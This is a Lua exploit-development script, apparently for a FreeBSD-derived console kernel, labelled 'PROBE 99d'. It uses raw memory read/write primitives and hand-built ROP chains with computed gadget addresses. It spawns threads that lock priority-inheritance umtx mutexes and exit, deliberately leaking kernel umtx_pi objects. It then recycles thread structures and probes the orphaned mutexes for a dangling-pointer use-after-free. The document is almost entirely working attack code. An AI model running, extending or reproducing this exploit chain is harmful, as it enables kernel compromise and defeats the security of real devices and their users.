-- CRASH_CLASS: HIGH
-- PROBE 99d: PI mutex umtx_pi kernel object leak measurement
--
-- 99c confirmed: kernel does NOT clean PI mutexes on thread exit.
-- Each LOCK+exit leaks one umtx_pi kernel object (~80-128 bytes).
-- This probe:
-- (A) Mass-leaks umtx_pi by batch-creating children that LOCK→exit
-- (B) Measures kernel VM growth rate per batch via sys 624
-- (C) After leaking, creates NEW threads to trigger td recycling
-- (D) Probes orphaned mutexes to test dangling pi_owner→recycled td

print("=== PROBE 99d: PI LEAK MEASUREMENT ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
if not SA then print("NO syscall_address") return end
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local mm=mk(477); local tc=mk(430); local c624=mk(624)
local sc_umtx=mk(454)

local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRSI=uint64(string.format("0x%X%08X",ehi,elo+0xD77D))

local _DI=0x048; local _SI=0x050; local _DX=0x058
local _R10=0x060; local _R8=0x068; local _AX=0x078
local _CS=0x0C0; local _FL=0x0D0; local _IP=0x0E0
local _SP=0x0F8; local _SS=0x100; local _MG=0x108; local _TP=0x110

local function vmc()
    local ok,c=pcall(function() return c624(uint64(0),uint64(0),uint64(0)) end)
    return ok and N(c) or -1
end

local BATCH=8
local STK_PG=2
local PG_PER_CHILD=STK_PG+1
-- Pages: 4 data + 8 children × 3 = 28 pages
local TOTAL_PG=4+BATCH*PG_PER_CHILD
local ok_m,region=pcall(function()
    return mm(uint64(0),uint64(TOTAL_PG*0x4000),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_m then print("MMAP FAIL") return end
local R=N(region)
print(string.format("region=0x%X batch=%d", R, BATCH))

-- Data area (page 0-3)
local ts999=R; wq(ts999,uint64(999)); wq(ts999+8,uint64(0))
local sl5=R+0x20; wq(sl5,uint64(0)); wq(sl5+8,uint64(5000000))
local sl10=R+0x40; wq(sl10,uint64(0)); wq(sl10+8,uint64(10000000))
local tb=R+0x60

-- Mutex array: 512 mutexes × 32 bytes = 16384 bytes = page 1
local MTX_BASE=R+0x4000
-- Exit state array: 512 × 8 bytes = page 2-3
local EXIT_BASE=R+0x8000

-- Child pages start at page 4
local function child_stk(i) return R+0x4000*(4+i*PG_PER_CHILD) end
local function child_ctx(i) return R+0x4000*(4+i*PG_PER_CHILD+STK_PG) end

local function pi_mtx_addr(idx) return MTX_BASE + idx * 32 end
local function exit_addr(idx) return EXIT_BASE + idx * 8 end

-- Spawn child: LOCK pi_mtx → thr_exit
local function spawn_lock_exit(slot, mtx_a, exit_a)
    local stk=child_stk(slot)
    local ctx=child_ctx(slot)
    local off=0

    -- After initial LOCK syscall, chain: thr_exit
    wq(stk+off,PRDI); off=off+8
    wq(stk+off,uint64(exit_a)); off=off+8
    wq(stk+off,PRAX); off=off+8
    wq(stk+off,uint64(431)); off=off+8
    wq(stk+off,SA); off=off+8
    -- Safety tail
    wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(ts999)); off=off+8
    wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(0)); off=off+8
    wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(240)); off=off+8
    wq(stk+off,SA); off=off+8

    z(ctx, 0x200)
    wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
    wq(ctx+_TP,uint64(0x10000))
    wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
    wq(ctx+_IP,SA); wq(ctx+_SP,uint64(stk))
    wq(ctx+_AX,uint64(454))
    wq(ctx+_DI,uint64(mtx_a))
    wq(ctx+_SI,uint64(5))   -- MUTEX_LOCK
    wq(ctx+_DX,uint64(0))
    wq(ctx+_R10,uint64(0))
    wq(ctx+_R8,uint64(0))

    wq(tb,uint64(0))
    pcall(function() tc(uint64(ctx),uint64(tb),uint64(0)) end)
    return rq(tb)
end

-- Spawn child: just nanosleep (no mutex — for td recycling pressure)
local function spawn_sleeper(slot)
    local stk=child_stk(slot)
    local ctx=child_ctx(slot)

    -- Minimal chain: nanosleep(5ms) → thr_exit(0)
    local off=0
    wq(stk+off,PRDI); off=off+8
    wq(stk+off,uint64(0)); off=off+8
    wq(stk+off,PRAX); off=off+8
    wq(stk+off,uint64(431)); off=off+8
    wq(stk+off,SA); off=off+8

    z(ctx, 0x200)
    wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
    wq(ctx+_TP,uint64(0x10000))
    wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
    wq(ctx+_IP,SA); wq(ctx+_SP,uint64(stk))
    wq(ctx+_AX,uint64(240))   -- nanosleep
    wq(ctx+_DI,uint64(sl5))   -- 5ms
    wq(ctx+_SI,uint64(0))
    wq(ctx+_DX,uint64(0))
    wq(ctx+_R10,uint64(0))
    wq(ctx+_R8,uint64(0))

    wq(tb,uint64(0))
    pcall(function() tc(uint64(ctx),uint64(tb),uint64(0)) end)
    return rq(tb)
end

-- ============================================================
print("--- A: MASS LEAK — batch LOCK→exit ---")
-- ============================================================

local ROUNDS=40
local total_leaked=0
local vm_start=vmc()
local canary_ok=true

for round=1,ROUNDS do
    -- Init fresh PI mutexes for this batch
    for s=0,BATCH-1 do
        local idx=((round-1)*BATCH)+s
        local ma=pi_mtx_addr(idx)
        z(ma, 32)
        wd(ma, 0)      -- m_owner = UNOWNED
        wd(ma+4, 4)    -- PRIO_INHERIT
        local ea=exit_addr(idx)
        wq(ea, uint64(0))
    end

    local vm_before=vmc()

    -- Spawn batch: each child locks unique PI mutex then exits
    for s=0,BATCH-1 do
        local idx=((round-1)*BATCH)+s
        spawn_lock_exit(s, pi_mtx_addr(idx), exit_addr(idx))
    end

    -- Wait for children to exit
    native.fcall_with_rax(stub,240,sl10,0)  -- 10ms

    local vm_after=vmc()
    local vmd=vm_after-vm_before

    -- Verify exits
    local exits_ok=0
    local stuck=0
    for s=0,BATCH-1 do
        local idx=((round-1)*BATCH)+s
        local ev=rd(exit_addr(idx)) or 0
        if ev==1 then exits_ok=exits_ok+1 end
        local mo=rd(pi_mtx_addr(idx)) or 0
        if mo~=0 then stuck=stuck+1 end
    end

    total_leaked=total_leaked+stuck
    local c=N(native.fcall_with_rax(stub,20))
    if c~=pid then canary_ok=false end

    -- Print every 5 rounds + first + last
    if round<=2 or round%5==0 or round==ROUNDS then
        print(string.format("R%02d: exits=%d/%d stuck=%d leaked_total=%d vmd=%d vm_total=%d canary=%s",
            round, exits_ok, BATCH, stuck, total_leaked,
            vmd, vm_after-vm_start, c==pid and "OK" or "!!FAIL"))
    end
end

local vm_after_leak=vmc()
print(string.format("\nA SUMMARY: %d threads, %d leaked PI objects, vm_growth=%d, canary=%s",
    ROUNDS*BATCH, total_leaked, vm_after_leak-vm_start, canary_ok and "OK" or "FAIL"))

-- ============================================================
print("")
print("--- B: TD RECYCLE PRESSURE ---")
-- Create+destroy many threads WITHOUT PI mutexes to recycle td structures
-- The leaked umtx_pi.pi_owner pointers should now reference recycled td
-- ============================================================

local vm_b_start=vmc()
local RECYCLE_ROUNDS=30

for round=1,RECYCLE_ROUNDS do
    for s=0,BATCH-1 do
        spawn_sleeper(s)
    end
    native.fcall_with_rax(stub,240,sl10,0)

    if round<=2 or round%10==0 or round==RECYCLE_ROUNDS then
        local c=N(native.fcall_with_rax(stub,20))
        print(string.format("recycle R%02d: canary=%s vm=%d",
            round, c==pid and "OK" or "!!FAIL", vmc()-vm_b_start))
    end
end

print(string.format("B: %d recycler threads, vm_growth=%d",
    RECYCLE_ROUNDS*BATCH, vmc()-vm_b_start))

-- ============================================================
print("")
print("--- C: PROBE ORPHANED MUTEXES ---")
-- Try LOCK/MUTEX_WAIT on early leaked mutexes (whose umtx_pi.pi_owner
-- should now point to recycled td structures)
-- ============================================================

-- Pick 5 mutexes from early rounds (indices 0-4)
for probe_idx=0,4 do
    local ma=pi_mtx_addr(probe_idx)
    local mo=rd(ma) or 0

    -- Try MUTEX_WAIT(17) — should detect dead owner
    local v1=vmc()
    local ok1,rv1=pcall(function()
        return sc_umtx(uint64(ma),uint64(17),uint64(0),uint64(0),uint64(0))
    end)
    local v2=vmc()
    local mo_after=rd(ma) or 0

    print(string.format("C[%d]: owner=0x%X MUTEX_WAIT(17)=%s vmd=%d owner_after=0x%X",
        probe_idx, mo, ok1 and tostring(N(rv1)) or "PCALL_FAIL", v2-v1, mo_after))
end

-- Try MUTEX_WAKE2(22) on orphaned mutexes
print("")
for probe_idx=0,4 do
    local ma=pi_mtx_addr(probe_idx)
    local mo=rd(ma) or 0

    local v1=vmc()
    local ok2,rv2=pcall(function()
        return sc_umtx(uint64(ma),uint64(22),uint64(0),uint64(0),uint64(0))
    end)
    local v2=vmc()

    print(string.format("C[%d]: WAKE2(22) owner=0x%X rv=%s vmd=%d",
        probe_idx, mo, ok2 and tostring(N(rv2)) or "PCALL_FAIL", v2-v1))
end

-- Try force-clearing owner then LOCK (simulates taking over a leaked mutex)
print("")
for probe_idx=0,2 do
    local ma=pi_mtx_addr(probe_idx)
    local old_owner=rd(ma) or 0

    -- Clear owner to 0 (UNOWNED) — dirty but tests if kernel follows pi_owner
    wd(ma, 0)

    local v1=vmc()
    local ok3,rv3=pcall(function()
        return sc_umtx(uint64(ma),uint64(5),uint64(0),uint64(0),uint64(0))
    end)
    local v2=vmc()
    local new_owner=rd(ma) or 0

    print(string.format("C[%d]: cleared 0x%X→0, LOCK rv=%s vmd=%d new_owner=0x%X",
        probe_idx, old_owner, ok3 and tostring(N(rv3)) or "PCALL_FAIL",
        v2-v1, new_owner))

    -- Unlock if we got it
    if ok3 and N(rv3)==0 then
        pcall(function()
            sc_umtx(uint64(ma),uint64(6),uint64(0),uint64(0),uint64(0))
        end)
    end
end

-- ============================================================
print("")
local final_canary=N(native.fcall_with_rax(stub,20))
print(string.format("FINAL: canary=%s leaked=%d vm_total=%d",
    final_canary==pid and "OK" or "!!FAIL="..final_canary,
    total_leaked, vmc()-vm_start))
print("=== 99d COMPLETE ===")
